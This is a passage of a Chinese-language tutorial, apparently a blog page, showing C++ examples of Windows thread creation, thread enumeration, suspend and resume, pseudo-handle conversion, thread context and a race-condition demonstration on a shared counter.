class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程回调函数的原型</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThread</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取到传入的参数</span></span><br><span class="line">LPCSTR Str = (LPCSTR)lpThreadParameter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环打印字符串</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WorkerThread: [%d]%s\n&quot;</span>, i, Str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 【主线程一旦退出，那么所有的子线程也会退出】</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建线程，返回值就是内核对象句柄</span></span><br><span class="line">HANDLE Thread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 线程的安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 默认栈的大小(局部变量、参数、返回地址)</span></span><br><span class="line">WorkerThread,<span class="comment">// 线程代码的起始位置</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15pb&quot;</span>,<span class="comment">// 线程函数的参数</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 创建标志</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 传出的线程ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数内也打印数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;MainThread\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程是可以等待的，因为线程内核对象有两种状态</span></span><br><span class="line"><span class="comment">// 当线程在执行时：属于非激发态(无信号状态)</span></span><br><span class="line"><span class="comment">// 当线程执行完毕时：属于激发态</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待内核对象变成激发态，如果是激发态就继续执行</span></span><br><span class="line"><span class="comment">// 否则阻塞当前线程，如果超出设置等待的时间，同样继续执行</span></span><br><span class="line"><span class="keyword">if</span> (Thread != <span class="literal">NULL</span>) WaitForSingleObject(Thread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历线程"><a href="#遍历线程" class="headerlink" title="遍历线程"></a>遍历线程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 包含对应的头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 2. 创建快照用于遍历线程，参数 1 为TH32CS_SNAPTHREAD， 参数 2 没有意义</span></span><br><span class="line"><span class="comment">//    在实际的使用中，参数2不管是什么，遍历到的都是所有的线程</span></span><br><span class="line">HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 初始化结构体用于保存遍历到的线程的数据</span></span><br><span class="line">THREADENTRY32 ThreadInfo = &#123; <span class="keyword">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 尝试遍历快照中的第一个线程</span></span><br><span class="line"><span class="keyword">if</span> (Thread32First(Snapshot, &amp;ThreadInfo))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 5. 输出对应的信息</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// [PID 和 TID 共用同一套数据]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1 筛选出对应进程的所有线程</span></span><br><span class="line"><span class="keyword">if</span> (ThreadInfo.th32OwnerProcessID == <span class="number">4936</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TID: %d\n&quot;</span>, ThreadInfo.th32ThreadID);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 遍历下一个线程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Thread32Next(Snapshot, &amp;ThreadInfo));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="挂起恢复"><a href="#挂起恢复" class="headerlink" title="挂起恢复"></a>挂起恢复</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 包含对应的头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 2. 创建快照用于遍历线程，参数 1 为TH32CS_SNAPTHREAD， 参数 2 没有意义</span></span><br><span class="line"><span class="comment">//    在实际的使用中，参数2不管是什么，遍历到的都是所有的线程</span></span><br><span class="line">HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 初始化结构体用于保存遍历到的线程的数据</span></span><br><span class="line">THREADENTRY32 ThreadInfo = &#123; <span class="keyword">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 尝试遍历快照中的第一个线程</span></span><br><span class="line"><span class="keyword">if</span> (Thread32First(Snapshot, &amp;ThreadInfo))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 5. 输出对应的信息</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// [PID 和 TID 共用同一套数据]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1 筛选出对应进程的所有线程</span></span><br><span class="line"><span class="keyword">if</span> (ThreadInfo.th32OwnerProcessID == <span class="number">5028</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 打开线程内核对象</span></span><br><span class="line">HANDLE Thread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, ThreadInfo.th32ThreadID);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挂起线程，每挂起一次线程，挂起计数就+1</span></span><br><span class="line"><span class="comment">// SuspendThread(Thread);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 恢复线程，每恢复一次，挂起计数-1，当挂起计数为0时，程序就可以运行了</span></span><br><span class="line">ResumeThread(Thread);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结束线程(需要结束线程的权限)</span></span><br><span class="line">TerminateThread(Thread, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭线程内核独享</span></span><br><span class="line">CloseHandle(Thread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 遍历下一个线程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Thread32Next(Snapshot, &amp;ThreadInfo));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用伪句柄"><a href="#使用伪句柄" class="headerlink" title="使用伪句柄"></a>使用伪句柄</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写函数打印线程的创建时间</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetThreadCreateTime</span><span class="params">(HANDLE Thread)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建对应的结构保存时间</span></span><br><span class="line">FILETIME CreateTime = &#123; <span class="number">0</span> &#125;, UserTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FILETIME KernelTime = &#123; <span class="number">0</span> &#125;, ExitTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用函数获取到线程的创建时间</span></span><br><span class="line">GetThreadTimes(Thread, &amp;CreateTime, </span><br><span class="line">&amp;ExitTime, &amp;KernelTime, &amp;UserTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将时间转换为本地的系统时间</span></span><br><span class="line">FILETIME LocalTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FileTimeToLocalFileTime(&amp;CreateTime, &amp;LocalTime);</span><br><span class="line">SYSTEMTIME SystemTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FileTimeToSystemTime(&amp;LocalTime, &amp;SystemTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出线程的创建时间</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d 年 %d 月 %d 日 %d 时 %d 分 %d 秒\n&quot;</span>,</span><br><span class="line">SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay,</span><br><span class="line">SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 工作线程</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThread</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取传入的主线程伪句柄</span></span><br><span class="line">HANDLE MainThread = (HANDLE)lpThreadParameter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在子线程中通过主线程的【伪句柄】打印它的创建时间</span></span><br><span class="line">GetThreadCreateTime(MainThread);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪句柄始终表示的所在的线程，所以使用伪句柄打印不了其它线程的信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取当前线程的伪句柄，线程的伪句柄始终是-2，进程伪句柄是-1</span></span><br><span class="line">HANDLE MainThread = GetCurrentThread();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在主线程中先打印出主线程的创建时间</span></span><br><span class="line">GetThreadCreateTime(MainThread);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两秒钟再创建子线程</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将主线程的伪句柄传入给子线程并打印伪句柄对应线程的创建时间</span></span><br><span class="line"><span class="comment">// 想要在工作线程中打印主线程的创建时间，需要传入主线程的句柄</span></span><br><span class="line">HANDLE Thread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThread,</span><br><span class="line">(LPVOID)MainThread, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待子线程执行结束</span></span><br><span class="line">WaitForSingleObject(Thread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="伪句柄转换"><a href="#伪句柄转换" class="headerlink" title="伪句柄转换"></a>伪句柄转换</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写函数打印线程的创建时间</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetThreadCreateTime</span><span class="params">(HANDLE Thread)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建对应的结构保存时间</span></span><br><span class="line">FILETIME CreateTime = &#123; <span class="number">0</span> &#125;, UserTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FILETIME KernelTime = &#123; <span class="number">0</span> &#125;, ExitTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用函数获取到线程的创建时间</span></span><br><span class="line">GetThreadTimes(Thread, &amp;CreateTime,</span><br><span class="line">&amp;ExitTime, &amp;KernelTime, &amp;UserTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将时间转换为本地的系统时间</span></span><br><span class="line">FILETIME LocalTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FileTimeToLocalFileTime(&amp;CreateTime, &amp;LocalTime);</span><br><span class="line">SYSTEMTIME SystemTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FileTimeToSystemTime(&amp;LocalTime, &amp;SystemTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出线程的创建时间</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d 年 %d 月 %d 日 %d 时 %d 分 %d 秒\n&quot;</span>,</span><br><span class="line">SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay,</span><br><span class="line">SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 工作线程</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThread</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取传入的主线程伪句柄</span></span><br><span class="line">HANDLE MainThread = (HANDLE)lpThreadParameter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在子线程中通过主线程的【句柄】打印它的创建时间</span></span><br><span class="line">GetThreadCreateTime(MainThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取当前线程的伪句柄，线程的伪句柄始终是-2，进程伪句柄是-1</span></span><br><span class="line">HANDLE MainThread = GetCurrentThread();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在主线程中先打印出主线程的创建时间</span></span><br><span class="line">GetThreadCreateTime(MainThread);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将伪句柄转换为真实的句柄</span></span><br><span class="line">HANDLE RealHandle = <span class="literal">NULL</span>;</span><br><span class="line">DuplicateHandle(</span><br><span class="line">GetCurrentProcess(),<span class="comment">// 拥有源句柄的进程句柄</span></span><br><span class="line">GetCurrentThread(),<span class="comment">// 需要转换的句柄(主线程伪句柄)</span></span><br><span class="line">GetCurrentProcess(),<span class="comment">// 想要将转换出的句柄放到哪个进程</span></span><br><span class="line">&amp;RealHandle,<span class="comment">// 用于保存新句柄</span></span><br><span class="line"><span class="number">0</span>,<span class="comment">// 安全访问级别</span></span><br><span class="line"><span class="literal">false</span>,<span class="comment">// 是否可以被子进程继承</span></span><br><span class="line">DUPLICATE_SAME_ACCESS); <span class="comment">// 转换选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两秒钟再创建子线程</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将主线程的[句柄]传入给子线程并打印句柄对应线程的创建时间</span></span><br><span class="line">HANDLE Thread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThread,</span><br><span class="line">(LPVOID)RealHandle, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待子线程执行结束</span></span><br><span class="line">WaitForSingleObject(Thread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线程环境"><a href="#线程环境" class="headerlink" title="线程环境"></a>线程环境</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取线程上下文</span></span><br><span class="line">CONTEXT stcCxt = &#123; CONTEXT_FULL &#125;;</span><br><span class="line"><span class="keyword">if</span> (!GetThreadContext(GetCurrentThread(), &amp;stcCxt))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过修改stcCxt来修改寄存器...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置进程上下文</span></span><br><span class="line"><span class="keyword">if</span> (!SetThreadContext(GetCurrentThread(), &amp;stcCxt))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><h3 id="多线程问题"><a href="#多线程问题" class="headerlink" title="多线程问题"></a>多线程问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 全局变量，同时被多个线程访问</span><br><span class="line">int Number &#x3D; 0;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 同步: 多个线程需要按照某种顺序执行</span><br><span class="line">&#x2F;&#x2F; 互斥: 多个线程操作(读写)同一个资源，不在意顺序</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 异步: 执行一件事情的时候，可以做其他事情，通常依赖函数[无论有没有完成都先返回] _kbhit()</span><br><span class="line">&#x2F;&#x2F; 同步: 执行一件事情的时候，必须等他完成(阻塞，等待函数的返回值)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 线程函数1</span><br><span class="line">DWORD WINAPI WorkerThreadA(LPVOID lpThreadParameter) </span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; 将全局变量 Number 自增十万次</span><br><span class="line">for (int i &#x3D; 0; i &lt; 100000; i++)</span><br><span class="line">&#123;</span><br><span class="line">Number++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 线程函数2</span><br><span class="line">DWORD WINAPI WorkerThreadB(LPVOID lpThreadParameter)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; 将全局变量 Number 自增十万次</span><br><span class="line">for (int i &#x3D; 0; i &lt; 100000; i++)</span><br><span class="line">&#123;</span><br><span class="line">Number++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">HANDLE hThread1 &#x3D; CreateThread(NULL, NULL, WorkerThreadA, NULL, NULL, NULL);</span><br><span class="line">HANDLE hThread2 &#x3D; CreateThread(NULL, NULL, WorkerThreadB, NULL, NULL, NULL);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等待两个线程同时执行结束</span><br><span class="line">WaitForSingleObject(hThread1, -1);</span><br><span class="line">WaitForSingleObject(hThread2, -1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 输出全局变量</span><br><span class="line">printf(&quot;%d&quot;, Number);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Number++ 一条指令被转换成了3条汇编指令(非原子操作)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; mov         eax, dword ptr[Number][0]: Number(0)</span><br><span class="line">&#x2F;&#x2F; add         eax, 1[0]: Number(0)  eax(1)</span><br><span class="line">&#x2F;&#x2F; mov         dword ptr[Number],eax[0]: Number(1)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; mov         eax, dword ptr[Number][1]: Number(1)</span><br><span class="line">&#x2F;&#x2F; add         eax, 1[1]: Number(1)  eax(2)</span><br><span class="line">&#x2F;&#x2F; mov         dword ptr[Number],eax[1]: Number(2)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; mov         eax, dword ptr[Number][0]: Number(2)</span><br><span class="line">&#x2F;&#x2F; add         eax, 1[0]: Number(2)  eax(3)  -----------</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; mov         eax, dword ptr[Number][1]: Number(2)</span><br><span class="line">&#x2F;&#x2F; add         eax, 1[1]: Number(2)  eax(3)</span><br><span class="line">&#x2F;&#x2F; mov         dword ptr[Number],eax[1]: Number(3)</span><br><span class="line"></span><br><span 